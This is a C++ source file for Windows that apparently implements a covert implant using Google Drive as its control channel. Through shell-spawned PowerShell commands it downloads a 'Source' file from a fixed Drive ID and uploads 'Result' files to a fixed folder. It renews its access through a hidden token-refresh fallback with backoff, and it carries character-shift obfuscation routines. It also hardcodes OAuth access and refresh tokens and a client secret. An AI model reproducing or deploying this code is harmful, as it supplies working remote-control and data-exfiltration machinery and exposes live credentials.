#include "MyString.h"
#include <windows.h>
#include <string>
#include <stdio.h>
#include <cmath>

#define min 32
#define max 126
#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
#define FAILSAFE_THRESHOLD 2402 * 1000
#define EXPONENTIAL_POWER 4
#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define SOURCE_DRIVE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
#define UPLOAD_BUFFER_SIZE 7680

static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static int index = 0;

static std::string g_access_token = "ya29.a0AcM612yHY7gtcQPAKq4fXAXxE17SmTO1jY9tI7oZVIGrZ_G-OvWj4QliYjHNuvli2KVz2l6HZjPLUGj1VQCCETovAVQEwo-ARdQvmokxbf3HKxMojAzY1KL3_NgMLUtCR5j7mNeqN3gFxz7YrU9R7BqgmrdMq1pLh9jepUc-aCgYKAe0SARASFQHGX2MiNFJ3Wt-aCzwIQD9qDrG1Sw0175";
static std::string g_refresh_token = "1//09oUhhVa2iB2lCgYIARAAGAkSNwF-L9IrO8UGnJT_FmGIEGksK2tBMWD44J6vXWhd2zlokIdykrkwahJsxm5qgsK1121-7kIBVLY";
static std::string g_client_secret = "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";
static std::string g_client_id = "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com";
static std::string g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
static boolean g_flag = false;

static DWORD expo(DWORD base, DWORD exponent) {
	if (exponent == 0) {
		return 1;
	}
	else if (exponent == 1) {
		return base;
	}
	DWORD half = expo(base, exponent / 2);
	return half * half * expo(base, exponent % 2);
}

inline static MyString converter_64(MyString inpu) {

	const char* input = inpu.getContext();
	size_t length = strlen(input);
	size_t len = 4 * ((length + 2) / 3);

	char* Cute = (char*)malloc(len + 1);

	size_t i, j;
	for (i = 0, j = 0; i < length;) {
		unsigned char a = i < length ? input[i++] : 0;
		unsigned char b = i < length ? input[i++] : 0;
		unsigned char c = i < length ? input[i++] : 0;

		unsigned int triple = (a << 16) | (b << 8) | c;

		Cute[j++] = bs64[(triple >> 18) & 0x3F];
		Cute[j++] = bs64[(triple >> 12) & 0x3F];
		Cute[j++] = (i > length + 1) ? '=' : bs64[(triple >> 6) & 0x3F];
		Cute[j++] = (i > length) ? '=' : bs64[triple & 0x3F];
	}

	Cute[len] = '\0';
	MyString result = Cute;
	return result;
}
//base 64 converter it's not working properly!!!!!!!!!!

static std::string base64_encode(const std::string& input) {
	std::string encoded;
	int val = 0, valb = -6;
	for (unsigned char c : input) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			encoded.push_back(bs64[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) {
		encoded.push_back(bs64[((val << 8) >> (valb + 8)) & 0x3F]);
	}
	while (encoded.size() % 4) {
		encoded.push_back('='); // Add padding if necessary
	}
	return encoded;
}


inline void decoder(char str[]) {
	str[0] += 7;
	str[1] += 7;
	int mode = (str[0] + str[1]) % 10;
	for (size_t i = 2; i < strlen(str); i++)
	{
		str[i] += mode;
	}

}
//decoder

static MyString encoder(MyString W, int shift) {
	char* str = W.getContext();
	for (int i = 0; i < strlen(str); i++) {
		char ch = str[i];
		if (ch >= min && ch <= max) {
			ch += shift;

			if (ch > max) {
				ch = min + (ch - max - 1);
			}
			else if (ch < min) {
				ch = max - (min - ch - 1);
			}

			str[i] = ch;
		}
	}
	MyString result = str;
	return result;
}
//shifting strings for encoding

/// <summary>
/// This function is used to request and set a new accessToken.
/// </summary>
/// <param name="accessToken">A string to output Access Token</param>
/// <param name="refreshToken">A string to just input Refresh Token</param>
/// <returns>
/// 200 OK!
/// 400 Bad Request!
/// </returns>
static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {

	char* buffer = new char[1024];
	sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", g_client_id.c_str(), g_client_secret.c_str(), refreshToken.c_str());
	///// you should edit here!
	FILE* file = _popen(buffer, "r");
	fgets(buffer, 1023, file);
	_pclose(file);

	if (buffer[0] == '4')
	{
		delete[] buffer;
		return 400;
	}
	accessToken = buffer;

	delete[] buffer;
	return 200;
}

/// <summary>
/// This method is going to get used in handling failsafe situation.
/// </summary>
/// <param name="refreshToken">A string to output Refresh Token</param>
/// <param name="accessToken">A string to output Access Token</param>
/// <returns>
/// 200 OK!
/// 204 No Content!
/// 400 Bad Request!
/// 401 Forbidden!
/// 406 Not Acceptable!
/// </returns>
static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
	char* buffer = new char[1024];
	memcpy(buffer, "It's empty!", 12);

	FILE* file = _popen("powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{Write-Host -NoNewline 400}\"", "r");

	fgets(buffer, 1023, file);
	_pclose(file);

	if (buffer[0] == 'I' && buffer[10] == '!') {

		delete[] buffer;
		return 204;
	}
	else if (buffer[0] == '4') {

		delete[] buffer;
		return 400;
	}
	else {
		if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
		{
			refreshToken = buffer;
			delete[] buffer;
			if (setNewAccessToken(accessToken, refreshToken) == 200)
			{
				return 200;
			}
			else {
				return 401;
			}
		}
		else {

			delete[] buffer;
			return 406;
		}
	}
}

/// <summary>
/// A procedure to handle the failsafe.
/// </summary>
/// <param name="refreshToken">A string to output Refresh Token</param>
/// <param name="accessToken">A string to output Access Token</param>
static void handleFailsafe(std::string& refreshToken, std::string& accessToken) {
	BYTE flag = true;
	BYTE i = 0;
	DWORD delay = 0;

	while (true)
	{
		//these two nested branches are to prevent of extra calculations and the other is to not exceeds the threshold
		if (flag)
		{
			delay = expo(i++, EXPONENTIAL_POWER) * 1000;
			if (delay > FAILSAFE_THRESHOLD)
			{
				flag = false;
				delay = FAILSAFE_THRESHOLD;
			}
		}
		Sleep(delay);

		switch (setNewRefreshAndAccessToken(refreshToken, accessToken)) {
		case 200:
			return;
			break;
		case 204:
		case 400:
		case 403:
		case 406:
			break;
		}
	}
}

/// <summary>
/// This function downloads the Source.txt file in the Drive
/// </summary>
/// <param name="accessToken">The access token as string</param>
/// <param name="output">An output string that has the downloaded content</param>
/// <returns>
/// 200 OK!
/// 204 No Content!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD downloadSourceContext(std::string accessToken, std::string& output) {
	char* buffer = new char[1024];

	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_DRIVE_ID,
		accessToken.c_str()
	);


	FILE* file = _popen(buffer, "r");
	while (fgets(buffer, 1024, file) != NULL) {
		output = output + buffer;
	}

	_pclose(file);
	delete[] buffer;

	if (output.length() == 0)
	{
		return 204;
	}
	else if (output.length() == 3)
	{
		if (output[0] == '6' && output[1] == '0' && output[2] == '0')
		{
			return 600;
		}
		else if (output[0] == '6' && output[1] == '0' && output[2] == '1') {
			return 601;
		}
	}
	return 200;
}

/// <summary>
/// This function upload a single file up to 6656 characters (Around 6.5 KB).
/// </summary>
/// <param name="uploadpart"></param>
/// <param name="accessToken"></param>
/// <param name="index"></param>
/// <param name="subIndex"></param>
/// 200 OK!
/// 401 Unauthorized!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD subIndex) {
	char* buffer = new char[UPLOAD_BUFFER_SIZE + 1];
	WORD errorCode = 200;
	snprintf(buffer, UPLOAD_BUFFER_SIZE, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", accessToken.c_str(), index, subIndex, RESULTS_FOLDER_ID, uploadpart.c_str());
	FILE* file = _popen(buffer, "r");
	delete[] buffer;
	buffer = new char[4];
	fgets(buffer, 4, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
	}
	delete[] buffer;
	return errorCode;
}

//static void upload(MyString data) {
//    char* buffer = new char[7000];
//    double tmp = static_cast<double>(data.getLength()) / 6000;
//    int i = ceil(tmp);
//    int subIndex = 0;
//    for (size_t j = 0; j < i; j++)
//    {
//        snprintf(buffer, 7000, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch{echo 4}\"", g_access_token.getContext(), index, subIndex, g_result_folder_id.getContext(), data.getSubString(j * 6000, j == i - 1 ? data.getLength() : (j + 1) * 6000).getContext());
//        FILE* file = _popen(buffer, "r");
//        char temp_buffer[1024];
//        MyString output = "";
//        while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
//            output = output + temp_buffer;
//        }
//        if (output.getCharAt(0) == '4') {
//            g_access_token = setNewAccessToken();
//            j--;
//        }
//        subIndex++;
//        _pclose(file);
//    }
//    delete[] buffer;
//    index++;
//}
////Upload
//static boolean deleteContext() {
//    char* buffer = new char[512];
//    snprintf(buffer, 512, "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"", g_access_token.getContext());
//    FILE* file = _popen(buffer, "r");
//    delete[] buffer;
//    buffer = new char[2];
//
//    fgets(buffer, 2, file);
//    if (buffer[0] == '4') {
//        g_access_token = setNewAccessToken();
//        delete[] buffer;
//        return deleteContext();
//    }
//    _pclose(file);
//    delete[] buffer;
//    return true;
//}